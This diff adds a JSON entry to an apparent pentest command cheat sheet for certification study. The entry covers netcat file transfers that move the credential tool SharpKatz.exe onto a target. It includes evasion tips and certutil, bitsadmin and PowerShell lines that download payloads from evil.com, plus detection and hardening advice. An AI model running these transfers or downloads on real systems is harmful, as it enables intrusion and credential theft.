@@ -1,0 +1,99 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "netcat",
+    "ncat"
+  ],
+  "tags": [
+    "netcat",
+    "ncat",
+    "transfer"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Netcat",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Target receives, attacker sends",
+      "command": "# target:   nc -l -p 8000 > SharpKatz.exe\n# attacker: nc -q 0 10.129.41.200 8000 < SharpKatz.exe"
+    }
+  ],
+  "notes": "`nc -lvnp 1234 > file` (receiver) and `nc <ip> 1234 < file` (sender), or /dev/tcp when nc is absent. No integrity check - md5sum both ends. Cleartext, so avoid for sensitive loot on a real test.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "base64-transfer",
+      "rel": "alternative",
+      "note": "Copy/paste when no port is reachable."
+    },
+    {
+      "id": "nc-listener",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "netcat-transfer",
+  "name": "Netcat / Ncat - File Transfer",
+  "command": "nc -l -p 8000 > out.exe   # receiver ; nc -q 0 <ip> 8000 < out.exe  # sender",
+  "description": "Move files with raw netcat/ncat when no HTTP/SMB is available - one side listens, the other sends. /dev/tcp can receive without any nc binary.",
+  "variations": [
+    {
+      "label": "Receiver listens (target)",
+      "command": "nc -l -p 8000 > SharpKatz.exe\n# ncat: ncat -l -p 8000 --recv-only > SharpKatz.exe"
+    },
+    {
+      "label": "Sender pushes (attacker)",
+      "command": "nc -q 0 <lhost> 8000 < SharpKatz.exe\n# ncat: ncat --send-only <lhost> 8000 < SharpKatz.exe"
+    },
+    {
+      "label": "Attacker serves, target pulls",
+      "command": "# attacker: sudo nc -l -p 443 -q 0 < SharpKatz.exe\n# target:   nc <lhost> 443 > SharpKatz.exe"
+    },
+    {
+      "label": "Receive via /dev/tcp (no nc)",
+      "command": "cat < /dev/tcp/<lhost>/443 > SharpKatz.exe"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "netcat/ncat pipe a file across a raw TCP connection (nc -lvnp on one side, nc target port < file on the other), or ncat with --send-only/--recv-only and optional TLS (--ssl) - a simple transfer with no protocol overhead.",
+    "prerequisites": "netcat/ncat on both ends and a reachable port between attacker and target.",
+    "impact": "Files moved over an arbitrary TCP port; with ncat --ssl the channel is encrypted.",
+    "detection": "A raw TCP connection on an unusual port carrying file data; nc/ncat in process logs; new file on disk. Plain nc traffic is inspectable; ncat --ssl is not.",
+    "artifacts": "An nc/ncat process; a connection on the chosen port; the transferred file.",
+    "prevention": "[MITRE T1105 M1037] Egress filtering (restrict outbound ports); IDS/IPS on raw transfers; application control/EDR flagging nc/ncat execution.",
+    "evasion": "Use a common-looking port (443) and ncat --ssl to encrypt and blend with TLS; short-lived connections reduce exposure.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
